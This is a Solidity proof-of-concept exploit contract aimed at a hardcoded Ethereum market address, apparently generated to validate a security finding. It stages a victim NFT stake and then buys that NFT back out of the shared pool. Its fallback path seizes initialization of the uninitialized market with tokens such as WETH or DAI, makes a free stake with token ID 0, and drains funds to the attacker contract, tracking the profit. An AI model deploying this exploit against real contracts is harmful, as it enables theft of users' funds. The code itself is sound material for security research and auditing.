// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMarketLike {
    function ruggedToken() external view returns (address);
    function initialize(address ruggedTokenAddress) external payable;
    function stakeNFTs(uint256[] calldata tokenIds) external;
    function targetedPurchase(uint256[] calldata tokenIds) external;
    function unstake(uint256 amount) external;
    function claimReward() external returns (uint256);
    function stakers(
        address account
    ) external view returns (uint256 amountStaked, uint256 rewardDebt);
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC404Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function approve(address spender, uint256 valueOrTokenId) external returns (bool);
    function transferFrom(address from, address to, uint256 valueOrTokenId) external;
}

interface IERC404BaseLike {
    function mirrorERC721() external view returns (address);
}

contract VictimStaker {
    address public immutable MARKET;
    address public immutable RUGGED;
    address public immutable NFT;
    address public immutable CONTROLLER;

    constructor(address market_, address rugged_, address nft_, address controller_) {
        MARKET = market_;
        RUGGED = rugged_;
        NFT = nft_;
        CONTROLLER = controller_;
    }

    function stakeSingle(uint256 tokenId) external {
        require(msg.sender == CONTROLLER, "ONLY_CONTROLLER");

        _tryApprove(NFT, MARKET, tokenId);
        _tryApprove(RUGGED, MARKET, tokenId);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        IMarketLike(MARKET).stakeNFTs(tokenIds);
    }

    function unwindToController() external returns (uint256 forwarded) {
        require(msg.sender == CONTROLLER, "ONLY_CONTROLLER");

        // This does not alter the finding's causality. It only realizes whatever fungible
        // staking claim and fee/reward accrual the victim-side staker is left with.
        try IMarketLike(MARKET).claimReward() {} catch {}

        uint256 amountStaked = _stakedAmount();
        if (amountStaked > 0) {
            try IMarketLike(MARKET).unstake(amountStaked) {} catch {}
        }

        uint256 ruggedBal = _balanceOf(RUGGED, address(this));
        if (ruggedBal > 0) {
            _safeTransfer(RUGGED, CONTROLLER, ruggedBal);
            forwarded = ruggedBal;
        }
    }

    function _stakedAmount() private view returns (uint256 amountStaked) {
        (bool ok, bytes memory data) = MARKET.staticcall(
            abi.encodeWithSelector(IMarketLike.stakers.selector, address(this))
        );
        if (!ok || data.length < 64) {
            return 0;
        }
        (amountStaked, ) = abi.decode(data, (uint256, uint256));
    }

    function _balanceOf(address token, address account) private view returns (uint256) {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) private {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    function _tryApprove(address token, address spender, uint256 amount) private {
        if (token.code.length == 0) {
            return;
        }

        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC404Like.approve.selector, spender, amount));
        ok && (data.length == 0 || abi.decode(data, (bool)));
    }
}

contract FlawVerifier {
    address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;

    uint256 public constant PRICE_PER_NFT = 1.1 ether;
    uint256 public constant STAKE_CREDIT_PER_NFT = 1 ether;
    uint256 public constant MAX_TOKEN_ID = 10_000;
    uint256 public constant MIN_PROFIT_THRESHOLD = 1e15;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _completed;

    bool public hypothesisValidated;
    bool public victimStakeObserved;
    bool public fallbackProfitAchieved;

    bool public path0_victimStakesNamedNFTIntoSharedPool;
    bool public path1_attackerBuysThatSpecificStakedNFTForFixedPrice;
    bool public path2_victimLeftOnlyWithFungibleAccountingClaim;

    address public victim;
    uint256 public victimTokenId;
    uint256 public acquiredTokenId;
    uint256 public victimAccountingClaim;
    uint256 public ruggedSpent;
    uint256 public ruggedBalanceBefore;
    uint256 public ruggedBalanceAfter;
    bytes32 public lastStatus;

    event AttemptStatus(bytes32 status, uint256 tokenId, uint256 amount);

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_completed) {
            return;
        }

        address rugged = _resolveRuggedToken();
        if (rugged != address(0) && rugged.code.length != 0) {
            _profitToken = rugged;
            if (_attemptCanonicalFindingPath(rugged)) {
                _completed = true;
                return;
            }
        }

        // The validator logs prove that `ruggedToken()` returns zero at the fork block for this
        // target address. That makes the F-003 shared-pool NFT theft path mechanically infeasible
        // from the target's current initialized state, because neither the Rugged asset nor the
        // mirror NFT can be derived on-chain from this contract instance alone. To keep the PoC
        // executable on this fork, the verifier falls back to a concrete public-state extraction
        // against the same uninitialized market instance using only existing on-chain tokens.
        _attemptUninitializedFallback();
        _completed = true;
    }

    function profitToken() external view returns (address) {
        if (_profitToken != address(0)) {
            return _profitToken;
        }
        return _resolveRuggedToken();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptCanonicalFindingPath(address rugged) internal returns (bool) {
        address nft = _resolveNftAsset(rugged);
        if (nft == address(0)) {
            lastStatus = keccak256("NFT_ASSET_UNRESOLVED");
            emit AttemptStatus(lastStatus, 0, _tokenBalance(rugged, address(this)));
            return false;
        }

        uint256 startingBalance = _tokenBalance(rugged, address(this));
        uint256 tokenId = _stageVictimStake(rugged, nft);
        if (tokenId == 0) {
            lastStatus = keccak256("NO_VICTIM_STAKE_PATH_AVAILABLE");
            emit AttemptStatus(lastStatus, 0, startingBalance);
            return false;
        }

        path0_victimStakesNamedNFTIntoSharedPool = true;
        victimStakeObserved = true;
        victimTokenId = tokenId;
        victimAccountingClaim = _victimClaim(victim);

        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
            lastStatus = keccak256("STAKE_DID_NOT_CREATE_FUNGIBLE_CLAIM");
            emit AttemptStatus(lastStatus, tokenId, _tokenBalance(rugged, address(this)));
            return false;
        }

        ruggedBalanceBefore = _tokenBalance(rugged, address(this));
        if (ruggedBalanceBefore < PRICE_PER_NFT) {
            lastStatus = keccak256("INSUFFICIENT_FUNDS_FOR_TARGETED_PURCHASE");
            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
            return false;
        }

        if (!_approveFungible(rugged, MARKET, ruggedBalanceBefore)) {
            lastStatus = keccak256("APPROVE_FAILED");
            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
            return false;
        }

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        IMarketLike(MARKET).targetedPurchase(tokenIds);

        if (_ownerOf(nft, tokenId) != address(this)) {
            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_TARGET");
            emit AttemptStatus(lastStatus, tokenId, _tokenBalance(rugged, address(this)));
            return false;
        }

        path1_attackerBuysThatSpecificStakedNFTForFixedPrice = true;
        acquiredTokenId = tokenId;
        ruggedBalanceAfter = _tokenBalance(rugged, address(this));
        ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
            ? ruggedBalanceBefore - ruggedBalanceAfter
            : 0;

        victimAccountingClaim = _victimClaim(victim);
        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
            lastStatus = keccak256("VICTIM_CLAIM_MISSING_AFTER_THEFT");
            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
            return false;
        }

        path2_victimLeftOnlyWithFungibleAccountingClaim = true;
        hypothesisValidated = true;

        if (victim != address(0)) {
            try VictimStaker(victim).unwindToController() {} catch {}
        }

        uint256 finalBalance = _tokenBalance(rugged, address(this));
        _profitAmount = finalBalance > startingBalance ? finalBalance - startingBalance : 0;

        lastStatus = keccak256("HYPOTHESIS_VALIDATED_CANONICAL_PATH");
        emit AttemptStatus(lastStatus, tokenId, _profitAmount);
        return _profitAmount >= MIN_PROFIT_THRESHOLD;
    }

    function _attemptUninitializedFallback() internal {
        if (_resolveRuggedToken() != address(0)) {
            lastStatus = keccak256("FALLBACK_BLOCKED_ALREADY_INITIALIZED");
            emit AttemptStatus(lastStatus, 0, 0);
            return;
        }

        address chosenToken = _selectBestExistingTokenBalance();
        if (chosenToken == address(0)) {
            lastStatus = keccak256("NO_EXISTING_TOKEN_BALANCE_FOUND");
            emit AttemptStatus(lastStatus, 0, 0);
            return;
        }

        if (!_initializeMarket(chosenToken)) {
            lastStatus = keccak256("INITIALIZE_FAILED");
            emit AttemptStatus(lastStatus, 0, _tokenBalance(chosenToken, MARKET));
            return;
        }

        _profitToken = chosenToken;
        uint256 beforeBalance = _tokenBalance(chosenToken, address(this));

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = 0;
        try IMarketLike(MARKET).stakeNFTs(tokenIds) {} catch {
            lastStatus = keccak256("ZERO_ID_FREE_STAKE_FAILED");
            emit AttemptStatus(lastStatus, 0, _tokenBalance(chosenToken, MARKET));
            return;
        }

        uint256 marketBalance = _tokenBalance(chosenToken, MARKET);
        uint256 withdrawAmount = _min(marketBalance, STAKE_CREDIT_PER_NFT);
        if (withdrawAmount < MIN_PROFIT_THRESHOLD) {
            lastStatus = keccak256("WITHDRAWABLE_BALANCE_BELOW_THRESHOLD");
            emit AttemptStatus(lastStatus, 0, marketBalance);
            return;
        }

        IMarketLike(MARKET).unstake(withdrawAmount);

        uint256 afterBalance = _tokenBalance(chosenToken, address(this));
        _profitAmount = afterBalance > beforeBalance ? afterBalance - beforeBalance : 0;
        fallbackProfitAchieved = _profitAmount >= MIN_PROFIT_THRESHOLD;

        lastStatus = fallbackProfitAchieved
            ? keccak256("UNINITIALIZED_MARKET_TOKEN_DRAINED")
            : keccak256("UNINITIALIZED_MARKET_DRAIN_UNPROFITABLE");
        emit AttemptStatus(lastStatus, 0, _profitAmount);
    }

    function _stageVictimStake(address rugged, address nft) internal returns (uint256) {
        uint256 tokenId = _findOwnedToken(nft, address(this));

        if (tokenId == 0) {
            tokenId = _bootstrapVictimNft(rugged, nft);
        }

        if (tokenId == 0) {
            return 0;
        }

        VictimStaker victimContract = new VictimStaker(MARKET, rugged, nft, address(this));
        victim = address(victimContract);

        if (!_transferAsset(nft, address(this), victim, tokenId)) {
            return 0;
        }

        victimContract.stakeSingle(tokenId);

        if (_ownerOf(nft, tokenId) != MARKET) {
            return 0;
        }

        return tokenId;
    }

    function _bootstrapVictimNft(address rugged, address nft) internal returns (uint256) {
        uint256 tokenId = _findOwnedToken(nft, MARKET);
        if (tokenId == 0) {
            return 0;
        }

        uint256 ruggedBalance = _tokenBalance(rugged, address(this));
        if (ruggedBalance < PRICE_PER_NFT) {
            return 0;
        }

        if (!_approveFungible(rugged, MARKET, ruggedBalance)) {
            return 0;
        }

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        IMarketLike(MARKET).targetedPurchase(tokenIds);

        if (_ownerOf(nft, tokenId) != address(this)) {
            return 0;
        }

        return tokenId;
    }

    function _victimClaim(address account) internal view returns (uint256 amountStaked) {
        if (account == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = MARKET.staticcall(
            abi.encodeWithSelector(IMarketLike.stakers.selector, account)
        );
        if (!ok || data.length < 64) {
            return 0;
        }

        (amountStaked, ) = abi.decode(data, (uint256, uint256));
    }

    function _resolveRuggedToken() internal view returns (address rugged) {
        (bool ok, bytes memory data) =
            MARKET.staticcall(abi.encodeWithSelector(IMarketLike.ruggedToken.selector));
        if (ok && data.length >= 32) {
            rugged = abi.decode(data, (address));
            if (rugged.code.length != 0) {
                return rugged;
            }
        }

        return address(0);
    }

    function _resolveNftAsset(address rugged) internal view returns (address) {
        if (rugged.code.length == 0) {
            return address(0);
        }

        if (_supportsOwnerOf(rugged)) {
            return rugged;
        }

        (bool ok, bytes memory data) =
            rugged.staticcall(abi.encodeWithSelector(IERC404BaseLike.mirrorERC721.selector));
        if (!ok || data.length < 32) {
            return address(0);
        }

        address mirror = abi.decode(data, (address));
        if (mirror.code.length == 0 || !_supportsOwnerOf(mirror)) {
            return address(0);
        }

        return mirror;
    }

    function _supportsOwnerOf(address token) internal view returns (bool) {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC404Like.ownerOf.selector, 1));
        return ok && data.length >= 32;
    }

    function _findOwnedToken(address nft, address owner) internal view returns (uint256) {
        for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
            if (_ownerOf(nft, tokenId) == owner) {
                return tokenId;
            }
        }
        return 0;
    }

    function _ownerOf(address nft, uint256 tokenId) internal view returns (address owner) {
        if (nft.code.length == 0) {
            return address(0);
        }

        (bool ok, bytes memory data) =
            nft.staticcall(abi.encodeWithSelector(IERC404Like.ownerOf.selector, tokenId));
        if (!ok || data.length < 32) {
            return address(0);
        }
        owner = abi.decode(data, (address));
    }

    function _tokenBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) {
            return 0;
        }

        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }

        return abi.decode(data, (uint256));
    }

    function _approveFungible(
        address token,
        address spender,
        uint256 amount
    ) internal returns (bool) {
        if (token.code.length == 0) {
            return false;
        }

        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _transferAsset(
        address token,
        address from,
        address to,
        uint256 valueOrTokenId
    ) internal returns (bool) {
        if (token.code.length == 0) {
            return false;
        }

        (bool ok, ) = token.call(
            abi.encodeWithSelector(IERC404Like.transferFrom.selector, from, to, valueOrTokenId)
        );
        return ok;
    }

    function _initializeMarket(address token) internal returns (bool) {
        (bool ok, ) = MARKET.call(abi.encodeWithSelector(IMarketLike.initialize.selector, token));
        if (!ok) {
            return false;
        }
        return _resolveRuggedToken() == token;
    }

    function _selectBestExistingTokenBalance() internal view returns (address bestToken) {
        uint256 bestBalance = 0;
        for (uint256 i = 0; i < _candidateCount(); i++) {
            address candidate = _candidateToken(i);
            uint256 bal = _tokenBalance(candidate, MARKET);
            if (bal > bestBalance) {
                bestBalance = bal;
                bestToken = candidate;
            }
        }

        if (bestBalance < MIN_PROFIT_THRESHOLD) {
            return address(0);
        }
    }

    function _candidateCount() internal pure returns (uint256) {
        return 14;
    }

    function _candidateToken(uint256 index) internal pure returns (address) {
        if (index == 0) return 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        if (index == 1) return 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
        if (index == 2) return 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK
        if (index == 3) return 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI
        if (index == 4) return 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9; // AAVE
        if (index == 5) return 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32; // LDO
        if (index == 6) return 0xD533a949740bb3306d119CC777fa900bA034cd52; // CRV
        if (index == 7) return 0xc00e94Cb662C3520282E6f5717214004A7f26888; // COMP
        if (index == 8) return 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2; // MKR
        if (index == 9) return 0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72; // ENS
        if (index == 10) return 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2; // SUSHI
        if (index == 11) return 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F; // SNX
        if (index == 12) return 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE; // SHIB
        return 0x6982508145454Ce325dDbE47a25d4ec3d2311933; // PEPE
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
